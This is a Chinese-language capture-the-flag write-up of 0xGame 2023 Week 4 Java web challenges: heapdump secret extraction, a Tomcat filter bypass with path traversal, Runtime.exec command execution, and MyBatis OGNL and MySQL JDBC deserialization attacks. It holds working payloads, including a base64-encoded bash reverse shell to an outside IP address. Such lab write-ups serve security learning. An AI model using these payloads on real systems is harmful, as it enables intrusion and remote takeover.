<p>这个在Spring MVC架构中是可用的，会泄露出推栈信息，其中是可以窃取到一些关键的信息，比如一些关键的Key，或者数据库连接密码，但是扫描工具没把它列为扫描端点。</p>
<p>看了一下文章，其中说是要利用一些工具的，地址如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p>
<p>这里直接下载jar包，同时确保本地有maven与java1.8以上的环境，直接按如下命令运行即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java -jar JDumpSpider-<span class="hljs-number">1.1</span>-SNAPSHOT-full.jar heapdump<br></code></pre></td></tr></table></figure>
<p>注意，将所要获取的信息文件放入至于jar同一目录下</p>
<p>![image-20231105100900189](0xGame 2023/image-20231105100900189.png)</p>
<p>如上图，成功得到flag</p>
<p>或者用其它工具比如 Memory Analyze Tool (MAT) 也行，用 MAT 的话查询语句如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> java.util.LinkedHashMap$Entry x <span class="hljs-keyword">WHERE</span>(toString(x.key).<span class="hljs-keyword">contains</span>(&quot;app.password&quot;))<br></code></pre></td></tr></table></figure>
<h2 id="Week-4-auth-bypass"><a href="#Week-4-auth-bypass" class="headerlink" title="Week-4-auth-bypass"></a>[Week 4] auth_bypass</h2>
<p>Hint 1: Tomcat Filter 绕过 (网上有类似的文章 也可以自己尝试 fuzz 一些畸形 url 路径)</p>
<p>Hint 2: 题目通过 war 包部署 预期需要 RCE 尝试通过任意文件下载获取更多信息</p>
<p>Hint 3: 利用 WEB-INF 目录</p>
<p>Hint 4: 你可能会用到的网站: <a target="_blank" rel="noopener" href="https://tools.zjun.info/runtime-exec-payloads/">https://tools.zjun.info/runtime-exec-payloads/</a></p>
<p>看了一眼题目给的附件，源码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span>  &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) req;<br><br>        <span class="hljs-keyword">if</span> (request.getRequestURI().contains(<span class="hljs-string">&quot;..&quot;</span>)) &#123;<br>            resp.getWriter().write(<span class="hljs-string">&quot;blacklist&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (request.getRequestURI().startsWith(<span class="hljs-string">&quot;/download&quot;</span>)) &#123;<br>            resp.getWriter().write(<span class="hljs-string">&quot;unauthorized access&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            chain.doFilter(req, resp);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这里主要是限制了<code>..</code>与<code>download</code>防止用户的目录穿越以及限制download路由的访问，接下来看一下另一个文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">currentPath</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext().getRealPath(<span class="hljs-string">&quot;/assets/&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">fileNameParameter</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);<br>        <span class="hljs-keyword">if</span> (fileNameParameter != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> (String) fileNameParameter;<br>            resp.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>,<span class="hljs-string">&quot;attachment;filename=&quot;</span>+fileName);<br>            <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(currentPath + fileName)) &#123;<br>                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];<br>                <span class="hljs-keyword">while</span> (input.read(buffer) != -<span class="hljs-number">1</span>) &#123;<br>                    resp.getOutputStream().write(buffer);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            resp.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br>            resp.getWriter().write(<span class="hljs-string">&quot;&lt;a href=\&quot;/download?filename=avatar.jpg\&quot;&gt;avatar.jpg&lt;/a&gt;&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>靠着GPT分析了一波，这段代码的作用就是获取到服务器上文件的真实路径以及文件名，以供后续的文件下载功能的使用，下载题目提示我们tomact filter绕过，那我们去看看怎么个事儿</p>
<p>这里绕过方式很多种，参考如下文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14801884.html">Java安全之Filter权限绕过</a></p>
<p>![image-20231105102419042](0xGame 2023/image-20231105102419042.png)</p>
<p>如图，这里我将download进行url编码后，这里页面显示成功访问了，不过这里还可以多/绕过，如下图</p>
<p>![image-20231105102608265](0xGame 2023/image-20231105102608265.png)</p>
<p>这里尝试直接读取flag，但依旧是无权访问</p>
<p>![image-20231105102719747](0xGame 2023/image-20231105102719747.png)</p>
<p>接下来也就没思路了，看wp</p>
<p>然后可以通过 <code>//download?filename=avatar.jpg</code> 下载文件, 但是无法读取 <code>/flag</code> (提示 Permission denied), 那么很明显需要 RCE</p>
<p>根据题目描述, 网站使用 war 打包</p>
<p>这个 war 其实也就相当于压缩包, Tomcat 在部署 war 的时候会将其解压, 而压缩包内会存在一个 WEB-INF 目录, 目录里面包含编译好的 .class 文件以及 web.xml (保存路由和类的映射关系)</p>
<p>这里浅浅了解一下WEB-INF目录：</p>
<p>WEB-INF 是 Java 的 WEB 应用的安全目录。如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF 主要包含一下文件或目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br><br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br><br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br><br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br><br>/WEB-INF/database.properties：数据库配置文件<br></code></pre></td></tr></table></figure>
<p>![image-20231105103345796](0xGame 2023/image-20231105103345796.png)</p>
<p>如图进行访问下载得到文件</p>
<p>![image-20231105103414371](0xGame 2023/image-20231105103414371.png)</p>
<p>这里的内部构造看不太懂，所以靠wp了：</p>
<p>存在 EvilServlet, 映射的路由为 <code>/You_Find_This_Evil_Servlet_a76f02cb8422</code></p>
<p>根据网上文章的知识点, 通过包名 (com.example.demo.EvilServlet) 构造对应的 class 文件路径并下载</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">//download?filename=../WEB-INF/classes/com/example/demo/EvilServlet.class<br></code></pre></td></tr></table></figure>
<p>下载之后我选择了jdk打开class文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilServlet</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;Evil_Cmd_Arguments_fe37627fed78&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>            resp.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var5) &#123;<br>            resp.getWriter().write(<span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这里上述代码提示我们是处理的post请求：doPost</p>
<p>直接 POST 访问 <code>/You_Find_This_Evil_Servlet_a76f02cb8422</code> 传个参就能执行命令</p>
<p>最后因为没有回显, 需要反弹 shell 或者通过 curl + burp collaborator 外带 flag</p>
<p>![image-20231105105149246](0xGame 2023/image-20231105105149246.png)</p>
<p>这里我直接hackbar进行执行了，如下图，但我不理解的是为何/readflag就能读取flag</p>
<p>![image-20231105105139403](0xGame 2023/image-20231105105139403.png)</p>
<p>不过官方wp采用的bp方式，有以下几个注意点：</p>
<p>这里首先得注意传入 Runtime.exec 的命令需要进行一次编码</p>
<p><a target="_blank" rel="noopener" href="https://www.adminxe.com/tools/code.html">https://www.adminxe.com/tools/code.html</a></p>
<p><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/scripts/runtime-exec-payloads.html">https://github.com/Threekiii/Awesome-Redteam/blob/master/scripts/runtime-exec-payloads.html</a></p>
<p>具体原因大家可以参考下面两篇文章</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/243329">https://www.anquanke.com/post/id/243329</a></p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/java-exec-command/">https://y4er.com/posts/java-exec-command/</a></p>
<p>然后 POST 传递命令时得先 urlencode 一次</p>
<h2 id="Week-4-YourBatis"><a href="#Week-4-YourBatis" class="headerlink" title="Week-4-YourBatis"></a>[Week 4] YourBatis</h2>
<p>Hint 1: 关注题目名称/描述 以及 pom.xml 中的依赖</p>
<p>Hint 2: SQL 注入不是考点 题目需要 RCE</p>
<p>Hint 3: MyBatis RCE 尝试结合网上的文章构造 Payload</p>
<p>Hint 4: 注意反编译 jar 包的时候请不要使用 jd-gui  尝试使用 jadx-gui 或 IDEA</p>
<p>Hint 5: 你可能会用到的网站: <a target="_blank" rel="noopener" href="https://tools.zjun.info/runtime-exec-payloads/">https://tools.zjun.info/runtime-exec-payloads/</a></p>
<p>Hint 6: 在进行 RCE 的时候 因为 OGNL 的解析问题 所以最终传入 Runtime.exec() 的命令内不得包含 { 和 }  可以尝试编码绕过</p>
<p>这里让我们关注题目名称，这里我直接搜索了mybatis漏洞，发现有很多相关复现文章，在此之前我们先打开jar包，之后将其中的文件用idea打开</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里让我们关注一下pom.xml，通过这个文件可以查看 jar 包使用的第三方库</p>
<p>这里我感觉重点就是mybatis-spring-boot-starter–版本为2.1.1，于是胡乱搜了一通，发现下面的信息</p>
<p>![image-20231105111503601](0xGame 2023/image-20231105111503601.png)</p>
<p>那这里估计就是跟着现有的漏洞去复现了，加上题目提示我们存在sql注入以及RCE，我们关键词一搜一大把，重点就是找到正确合理的文章了</p>
<p><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1227.html">Mybatis 从SQL注入到OGNL注入</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1749">从一道CTF题浅谈MyBatis与Ognl的那些事</a></p>
<p>UserSqlProvider</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> com.example.yourbatis.provider;<br><br><span class="hljs-keyword">import</span> org.apache.ibatis.jdbc.SQL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserSqlProvider</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserSqlProvider</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">buildGetUsers</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;<br>            &#123;<br>                <span class="hljs-built_in">this</span>.SELECT(<span class="hljs-string">&quot;*&quot;</span>);<br>                <span class="hljs-built_in">this</span>.FROM(<span class="hljs-string">&quot;users&quot;</span>);<br>            &#125;<br>        &#125;).toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">buildGetUserByUsername</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String username)</span> &#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;<br>            &#123;<br>                <span class="hljs-built_in">this</span>.SELECT(<span class="hljs-string">&quot;*&quot;</span>);<br>                <span class="hljs-built_in">this</span>.FROM(<span class="hljs-string">&quot;users&quot;</span>);<br>                <span class="hljs-built_in">this</span>.WHERE(String.format(<span class="hljs-string">&quot;username = &#x27;%s&#x27;&quot;</span>, username));<br>            &#125;<br>        &#125;).toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这里显示了查询的sql语句，重点在最后一个方法：select * from users where…，这里估计就是漏洞注入点了</p>
<p>看了看文章，感觉payload格式应该是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$&#123;RCE&#125;<br></code></pre></td></tr></table></figure>
<p>但不了解java的rce的代码，只能看wp了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-meta">@java</span>.lang.Runtime<span class="hljs-meta">@getRuntime()</span>.exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
<p>但是很显然是会失败的, 因为传入的命令包含了 <code>&#123;</code> 和 <code>&#125;</code>, 会被递归解析为另一个 OGNL 表达式的开头和结尾</p>
<p>这个点可能比较难, 所以后面给出了 hint</p>
<p>解决方案是只要不出现大括号就行, 方法很多, 这里给出一种, 利用 OGNL 调用 Java 自身的 base64 decode 方法</p>
<p>这里要将<code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code>进行base64编码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-meta">@java</span>.lang.Runtime<span class="hljs-meta">@getRuntime()</span>.exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(<span class="hljs-meta">@java</span>.util.Base64<span class="hljs-meta">@getDecoder()</span>.decode(<span class="hljs-string">&#x27;YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TWpRdU1qSXdMakl6TXk0eU5pODFOVFUxSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQ==&#x27;</span>)))&#125;<br></code></pre></td></tr></table></figure>
<p>![image-20231105113238166](0xGame 2023/image-20231105113238166.png)</p>
<p>如上图，拿到flag</p>
<h2 id="Week-4-TestConnection"><a href="#Week-4-TestConnection" class="headerlink" title="Week-4-TestConnection"></a>[Week 4] TestConnection</h2>
<p>Hint 1: JDBC 会不会存在一些漏洞?</p>
<p>Hint 2: MySQL / PostgreSQL Jdbc Attack</p>
<p>Hint 3: 你可能会用到的网站: <a target="_blank" rel="noopener" href="https://tools.zjun.info/runtime-exec-payloads/">https://tools.zjun.info/runtime-exec-payloads/</a></p>
<p>这里似乎考的就是MySQL / PostgreSQL Jdbc Attack 了，下面跟着wp复现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问<br><br>JDBC URL 就是用于连接数据库的字符串, 格式为 `jdbc:db-type://host:port/db-name?param=value`<br><br>db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite<br><br>db-name 是要使用的数据库名<br><br>param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等<br><br>当 jdbc url 可控时, 如果目标网站使用了旧版的数据库驱动, 在特定情况下就可以实现 RCE<br></code></pre></td></tr></table></figure>
<p>参考文章:</p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1877/">https://tttang.com/archive/1877/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11812">https://xz.aliyun.com/t/11812</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1339">https://forum.butian.net/share/1339</a></p>
<p>在pom.xml中看到两个依赖：mysql与postgresql</p>
<p>![image-20231105153731477](0xGame 2023/image-20231105153731477.png)</p>
<p>给了两个依赖, mysql 和 postgresql, 对应两种利用方式</p>
<p>然后还有 commons-collections 依赖, 这个主要是方便大家在后面用 ysoserial 工具去生成反序列化 payload</p>
<p>首先是 mysql 驱动的利用</p>
<p>结合网上文章可以构造对应的 jdbc url：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span><br></code></pre></td></tr></table></figure>
<p>首先得注意, 因为题目给的代码是 <code>DriverManager.getConnection(url, username, password);</code>, 即会单独传入一个 username 参数, 因此 url 中的 username 会被后面的 username 给覆盖</p>
<p>网上的部分利用工具会通过 username 来区分不同的 payload, 所以得注意 username 要单独传, 不然写在 url 里面就被覆盖了</p>
<p>其次, 因为 jdbc url 本身也符合 url 的规范, 所以在传 url 参数的时候, 需要把 url 本身全部进行 url 编码, 防止服务器错把 autoDeserialize, queryInterceptors 这些参数当成是一个 http get 参数, 而不是 jdbc url 里面的参数</p>
<p>最后依然是 Runtime.exec 命令编码的问题</p>
<p>一些 mysql jdbc 利用工具</p>
<p><a target="_blank" rel="noopener" href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rmb122/rogue_mysql_server">https://github.com/rmb122/rogue_mysql_server</a></p>
<p>payload</p>
